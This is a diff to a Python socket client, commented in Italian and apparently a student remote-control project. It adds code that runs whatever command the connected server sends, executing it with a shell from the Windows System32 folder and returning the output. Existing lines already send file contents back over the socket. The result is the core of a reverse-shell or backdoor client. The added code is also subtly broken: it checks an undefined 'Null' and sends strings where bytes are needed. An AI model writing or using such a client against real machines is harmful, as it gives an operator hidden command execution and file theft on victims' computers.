@@ -2,6 +2,8 @@ from socket import *
 import platform
 import os
 import psutil
+import subprocess
+
 serverName = 'localhost'              #corrisponde a 127.0.0.1
 serverPort = 12000                    #usata solo per pairing iniziale, il S.O. assegna poi una porta
 clientSocket = socket(AF_INET, SOCK_STREAM)
@@ -36,4 +38,14 @@ while command != 'exit':
         data = file.read()
         clientSocket.send(data.encode())
         file.close()
+    if command != 'ls' and not command.startswith('0') and not command.startswith('1'):
+        cmd = "cd C:\Windows\System32 && "
+        proc = subprocess.Popen(cmd+command, stdout=subprocess.PIPE, shell=True)
+        out, err = proc.communicate()
+        if out == Null:  #AGGIUSTANI
+            out = 'comando inesistente'
+            clientSocket.send(out)
+        else:
+            clientSocket.send(out)
+
 clientSocket.close()
